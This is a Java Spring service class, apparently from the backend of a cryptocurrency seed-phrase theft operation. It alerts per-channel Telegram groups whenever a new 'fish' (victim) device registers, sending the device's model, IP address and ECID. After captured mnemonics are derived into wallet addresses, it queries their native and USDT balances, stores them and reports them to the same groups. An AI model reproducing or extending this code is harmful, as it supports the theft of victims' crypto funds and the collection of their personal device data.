package com.consumer.service;

import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import javax.annotation.Resource;

import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import com.consumer.dao.Address4Dao;
import com.consumer.dao.ChannelDao;
import com.consumer.dao.DeviceDao;
import com.consumer.entity.Address4Entity;
import com.consumer.entity.ChannelEntity;
import com.consumer.entity.DeviceEntity;
import com.consumer.util.MessageFormatUtils;
import com.consumer.util.TelegramNotificationUtil;
import com.consumer.util.WalletBalanceQuery;
import com.consumer.util.WalletBalanceQuery.ChainBalance;

import lombok.extern.slf4j.Slf4j;

/**
 * 助记词 / 余额飞机通知（异步 + 并发限流）。
 * <p>必须通过外部 Bean 调用，{@link Async} 才经 AOP 生效。
 */
@Service
@Slf4j
public class MnemonicTelegramService {

    private static final DateTimeFormatter DTF = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    /** 同 device 短时内避免重复发「新鱼苗」（parse_ci + tonhub 补写并发） */
    private final ConcurrentHashMap<String, Long> fishDedup = new ConcurrentHashMap<>();
    /** 同 mnemonicId 只发一次余额通知（news4 重试） */
    private final ConcurrentHashMap<Integer, Boolean> balanceDedup = new ConcurrentHashMap<>();

    private static final long FISH_DEDUP_MS = 120_000L;

    @Resource
    private TelegramNotificationUtil telegramNotificationUtil;
    @Resource
    private ChannelDao channelDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private Address4Dao address4Dao;
    @Resource
    private WalletBalanceQuery walletBalanceQuery;

    @Async("telegramMsgExecutor")
    public void notifyFishAsync(DeviceEntity device) {
        try {
            if (device == null) return;
            String dedupKey = firstNonEmpty(device.getDeviceId(), String.valueOf(device.getId()));
            long now = System.currentTimeMillis();
            Long prev = fishDedup.putIfAbsent(dedupKey, now);
            if (prev != null && now - prev < FISH_DEDUP_MS) {
                log.info("【telegram】新鱼苗去重跳过 device={} within={}ms", dedupKey, now - prev);
                return;
            }
            if (prev != null) {
                fishDedup.put(dedupKey, now);
            }
            pruneDedup(fishDedup, now, FISH_DEDUP_MS);

            ChannelEntity channel = resolveChannel(device.getChannelCode());
            if (channel == null) {
                log.info("【telegram】渠道无 telegram_groupid，跳过新鱼苗 device={} channel={}",
                        device.getDeviceId(), device.getChannelCode());
                return;
            }
            String groupId = channel.getTelegramGroupid();
            String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
            String text = MessageFormatUtils.saveMnemonicFishTelegram(
                    groupId,
                    device.getChannelCode(),
                    channel.getName(),
                    device.getModel(),
                    device.getIp(),
                    firstNonEmpty(device.getEcid(), device.getDeviceId()),
                    datetime);
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        } catch (Exception e) {
            log.warn("【telegram】新鱼苗通知失败 device={} err={}",
                    device == null ? null : device.getDeviceId(), e.toString());
        }
    }

    /**
     * 派生完成后：并行查余额 → 回写 address4 → 发余额飞机消息。
     * <p>由 news4 notifyPool 调用（本身已异步），勿再套 @Async，以免占满 telegram 线程池。
     */
    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, String deviceId,
                                              String channelCodeFallback,
                                              List<Address4Entity> addresses) {
        try {
            if (mnemonicId == null || addresses == null || addresses.isEmpty()) return;
            if (balanceDedup.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
                log.info("【telegram】余额通知去重跳过 mnemonicId={}", mnemonicId);
                return;
            }

            Map<String, String> chainAddr = new HashMap<>();
            for (Address4Entity a : addresses) {
                if (a == null || a.getChaintype() == null || a.getAddress() == null) continue;
                String c = a.getChaintype().toLowerCase();
                chainAddr.putIfAbsent(c, a.getAddress());
            }
            Map<String, ChainBalance> balances = walletBalanceQuery.queryAll(chainAddr);

            // 回写余额
            double refreshed = System.currentTimeMillis() / 1000.0;
            for (Address4Entity a : addresses) {
                if (a == null || a.getChaintype() == null) continue;
                ChainBalance b = balances.get(a.getChaintype().toLowerCase());
                if (b == null) continue;
                try {
                    address4Dao.updateBalance(mnemonicId, a.getChaintype(), a.getAddrindex(),
                            b.getNativeBal(), b.getUsdtBal(), refreshed);
                } catch (Exception e) {
                    log.warn("【telegram】回写余额失败 mnemonicId={} chain={} err={}",
                            mnemonicId, a.getChaintype(), e.toString());
                }
            }

            DeviceEntity device = null;
            if (deviceId != null && !deviceId.isEmpty()) {
                try { device = deviceDao.findByDeviceid(deviceId); } catch (Exception ignore) {}
            }
            String channelCode = device != null ? device.getChannelCode() : channelCodeFallback;
            ChannelEntity channel = resolveChannel(channelCode);
            if (channel == null) {
                log.info("【telegram】渠道无 telegram_groupid，跳过余额通知 mnemonicId={} channel={}",
                        mnemonicId, channelCode);
                return;
            }
            String groupId = channel.getTelegramGroupid();
            String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
            String model = device == null ? null : device.getModel();
            String ip = device == null ? null : device.getIp();
            String ecid = device == null ? deviceId
                    : firstNonEmpty(device.getEcid(), device.getDeviceId());
            String text = MessageFormatUtils.saveBalanceTelegram(
                    groupId, channelCode, channel.getName(), mnemonicId,
                    model, ip, ecid, datetime, balances);
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        } catch (Exception e) {
            log.warn("【telegram】余额通知失败 mnemonicId={} err={}", mnemonicId, e.toString());
            // 失败允许后续重试：移除去重标记
            if (mnemonicId != null) balanceDedup.remove(mnemonicId);
        }
    }

    private ChannelEntity resolveChannel(String channelCode) {
        if (channelCode == null || channelCode.isEmpty()) return null;
        ChannelEntity channel = channelDao.findByChannelcode(channelCode);
        if (channel == null || channel.getTelegramGroupid() == null
                || channel.getTelegramGroupid().isEmpty()) {
            return null;
        }
        return channel;
    }

    private static void pruneDedup(ConcurrentHashMap<String, Long> map, long now, long ttl) {
        if (map.size() < 500) return;
        map.entrySet().removeIf(e -> now - e.getValue() > ttl);
    }

    private static String firstNonEmpty(String a, String b) {
        if (a != null && !a.isEmpty()) return a;
        return b == null ? "" : b;
    }
}
